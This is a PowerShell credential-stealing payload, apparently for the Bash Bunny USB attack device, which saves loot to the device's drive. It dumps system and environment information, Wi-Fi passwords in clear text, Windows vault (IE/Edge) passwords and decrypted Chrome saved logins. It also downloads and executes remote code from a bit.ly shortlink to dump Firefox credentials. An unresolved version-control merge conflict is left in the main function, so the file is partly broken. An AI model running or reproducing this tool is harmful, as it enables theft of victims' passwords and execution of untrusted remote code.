

#################### MAIN ##########################
function _main_
{
param(
    [string]$LOOTDIR="\loot\DumpCreds",
    [String]$APPEND="false"
    )
# Function to run
$FUNC = "Get-Creds"

    
    $Bunny = (gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter)
    if ($Bunny) {
        if (!(Test-Path "$Bunny\$LOOTDIR")) {
            new-item "$Bunny\$LOOTDIR" -itemtype directory
        }
        if (Test-path "$Bunny\$LOOTDIR\LED.TXT") {
            remove-item "$Bunny\$LOOTDIR\LED.TXT" 
        }

        $OUT="$Bunny\$LOOTDIR\$env:computername.txt"
        if ($append -eq "true" ) {
            & $FUNC |Out-File -Append $OUT
        } else {
            & $FUNC |Out-File $OUT
        }
    } else {
<<<<<<< .mine
        exit

=======
        Write-Output "No Bunny insert"
        Get-Creds
>>>>>>> .theirs
    }

# OK We are ready .... creeate LED File in $LOOTDIR - bash bunny is waiting for it

#  Write-Output "R B 200" |out-file "$Bunny\$LOOTDIR\LED.TXT"

}

#########################################
###### Don't change anything below ######
#########################################

function Get-Creds {


# Windows Informationen


    Write-output "##Computer Info"
    Write-Output "======================================================"
    Write-Output ""
    $sServer = "."
    $sOS =Get-WmiObject -class Win32_OperatingSystem -computername $sServer
    $sOS | Select-Object Description, Caption, OSArchitecture, BuildNumber | Format-List
    Write-Output ""
    Get-ChildItem env: |sort name
    Write-Output ""
    Write-Output ""

    Write-Output "##WiFi Info"
    Write-Output "======================================================"
    Write-Output ""
    Get-WiFiCreds
    
    Write-Output ""
    Write-Output "##IE / Edge"
    Write-Output "======================================================"
    Write-Output ""
    Get-IECreds

    Write-Output ""
    Write-Output ""
    Write-Output "##Chrome"
    Write-Output "======================================================"
    Write-Output ""
    Get-ChromeCreds

    Write-Output ""
    Write-Output ""
    Write-Output "##FireFox"
    Write-Output "======================================================"
    $powershellx86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell.exe"
    & $powershellx86 -command "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2not5sV'); Get-FoxDump"
}





function Get-WiFiCreds {

    $WLAN = netsh wlan show profiles | Select-String ": (.*)" |% { $_.Matches.Groups[1].Value }

    foreach ( $SSID in $WLAN ) {
	    $Network = netsh wlan show profiles name=$SSID key=clear
	    $AuthType = (($Network | Select-String "Authentifizierung") -split(": "))[1] # set according to you language
        $Password = (($Network | select-string "sselinhalt") -split(": "))[1]	     # in us its Authentication
	    $obj=New-Object PSObject
        $obj | Add-Member NoteProperty SSID($SSID)
        $obj | Add-Member NoteProperty Authentication($AuthType)
        $obj | Add-Member NoteProperty Password($Password)
        Write-Output $obj -
    }
}

function Get-IECreds {
$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$VaultObj = new-object Windows.Security.Credentials.PasswordVault
$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ } |select Resource, UserName, Password | Sort-Object Resource  | ft -Autosize
}

# Instructions: import the module, then perform the commanded needed.
# Currently only supports Chrome credential extraction, more to come!

# Chrome Credential Extraction
# Use: Get-ChromeCreds [path to Login Data]
# Path is optional, use if automatic search doesn't work

function Get-ChromeCreds() {
	Param(
		[String]$Path
	)

	if ([String]::IsNullOrEmpty($Path)) {
		$Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
	}

	if (![system.io.file]::Exists($Path))
	{
		Write-Error 'Chrome db file doesnt exist, or invalid file path specified.'
		Break
	}

	Add-Type -AssemblyName System.Security
	# Credit to Matt Graber for his technique on using regular expressions to search for binary data
	$Stream = New-Object IO.FileStream -ArgumentList "$Path", 'Open', 'Read', 'ReadWrite'
	$Encoding = [system.Text.Encoding]::GetEncoding(28591)
	$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	$BinaryText = $StreamReader.ReadToEnd()
	$StreamReader.Close()
	$Stream.Close()

	# First the magic bytes for the password. Ends using the "http" for the next entry.
	$PwdRegex = [Regex] '(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70)'
	$PwdMatches = $PwdRegex.Matches($BinaryText)
	$PwdNum = 0
	$DecPwdArray = @()

	# Decrypt the password macthes and put them in an array
	Foreach ($Pwd in $PwdMatches) {
		$Pwd = $Encoding.GetBytes($PwdMatches[$PwdNum])
		$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
		$DecPwd = [System.Text.Encoding]::Default.GetString($Decrypt)
		$DecPwdArray += $DecPwd
		$PwdNum += 1
	}

	# Now the magic bytes for URLs/Users. Look behind here is the look ahead for passwords.
	$UserRegex = [Regex] '(?<=\x0D\x0D\x0D\x08\x08)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
	$UserMatches = $UserRegex.Matches($BinaryText)
	$UserNum = 0
	$UserArray = @()
	
	# Put the URL/User matches into an array
	Foreach ($User in $UserMatches) {
		$User = $Encoding.GetBytes($UserMatches[$UserNum])
		$UserString = [System.Text.Encoding]::Default.GetString($User)
		$UserArray += $UserString
		$UserNum += 1
	}

	# Now create an object to store the previously created arrays
	# I wasn't able to split up the URL/Username, but should be pretty easy to distinguish
	# To view the entire User/URL field, use Get-ChromeCreds | Select-Object -ExpandProperty "UserURL"
	$ArrayFinal = New-Object -TypeName System.Collections.ArrayList
	for ($i = 0; $i -lt $UserNum; $i++) {
		$ObjectProp = @{
			Password = $DecPwdArray[$i]
			UserURL = $UserArray[$i]
		}
	
		$obj = New-Object PSObject -Property $ObjectProp
		$ArrayFinal.Add($obj) | Out-Null
		}
	$ArrayFinal
}


 ### _main_ -LOOTDIR "\loot\DumpCreds" -APPEND "false"